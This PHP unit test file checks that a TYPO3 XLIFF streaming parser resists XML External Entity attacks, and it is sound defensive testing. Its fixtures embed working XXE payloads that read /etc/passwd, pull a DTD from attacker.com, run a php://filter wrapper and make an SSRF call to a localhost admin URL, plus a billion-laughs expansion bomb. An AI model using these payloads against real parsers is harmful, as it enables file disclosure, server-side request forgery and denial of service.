<?php

declare(strict_types=1);

namespace Netresearch\NrXliffStreaming\Tests\Unit\Parser;

use Netresearch\NrXliffStreaming\Parser\XliffStreamingParser;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\Test;
use TYPO3\TestingFramework\Core\Unit\UnitTestCase;

/**
 * XXE (XML External Entity) Attack Protection Tests
 *
 * Tests that the streaming parser is protected against XXE attacks:
 * - CWE-611: Improper Restriction of XML External Entity Reference
 * - CVSS 7.5-8.5 (HIGH severity)
 *
 * @author Netresearch DTT GmbH <info@netresearch.de>
 */
#[CoversClass(XliffStreamingParser::class)]
final class XliffStreamingParserXXETest extends UnitTestCase
{
    private XliffStreamingParser $subject;

    protected function setUp(): void
    {
        parent::setUp();
        $this->subject = new XliffStreamingParser();
    }

    #[Test]
    public function xxePayloadWithFileReadIsBlocked(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="xxe.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        $units = iterator_to_array($this->subject->parseTransUnits($xxePayload));

        // XMLReader does not expand external entities by default
        // Verify that entity is not expanded
        self::assertCount(1, $units);
        self::assertStringNotContainsString('root:', $units[0]['source'], 'XXE entity should not be expanded');
        self::assertStringNotContainsString('/etc/passwd', $units[0]['source'], 'XXE file path should not be visible');
    }

    #[Test]
    public function xxePayloadWithNetworkAccessIsBlocked(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="network.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        $units = iterator_to_array($this->subject->parseTransUnits($xxePayload));

        // LIBXML_NONET flag in SimpleXMLElement prevents network access
        self::assertCount(1, $units);
        self::assertStringNotContainsString('attacker', $units[0]['source'], 'XXE network entity should not be fetched');
    }

    #[Test]
    public function billionLaughsAttackIsMitigated(): void
    {
        $billionLaughs = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="dos.test">
                <source>&lol3;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        $units = iterator_to_array($this->subject->parseTransUnits($billionLaughs));

        // XMLReader does not expand nested entities by default
        if (count($units) > 0) {
            $sourceLength = strlen($units[0]['source']);
            self::assertLessThan(
                100,
                $sourceLength,
                'Billion Laughs attack should not cause exponential expansion'
            );
        } else {
            self::assertTrue(true, 'Billion Laughs attack prevented parsing');
        }
    }

    #[Test]
    public function xxePayloadWithPhpWrapperIsBlocked(): void
    {
        $phpWrapper = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="php.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        $units = iterator_to_array($this->subject->parseTransUnits($phpWrapper));

        // PHP wrapper access should be blocked
        self::assertCount(1, $units);
        self::assertStringNotContainsString('base64', $units[0]['source'], 'PHP wrapper should not be executed');
    }

    #[Test]
    public function ssrfAttackViaXxeIsBlocked(): void
    {
        $ssrfPayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "http://localhost:8080/admin/delete-all">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="ssrf.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        $units = iterator_to_array($this->subject->parseTransUnits($ssrfPayload));

        // SSRF via XXE should be blocked by LIBXML_NONET
        self::assertCount(1, $units);
        self::assertStringNotContainsString('admin', $units[0]['source'], 'SSRF attack should be blocked');
        self::assertStringNotContainsString('localhost', $units[0]['source'], 'Internal URLs should not be accessible');
    }
}
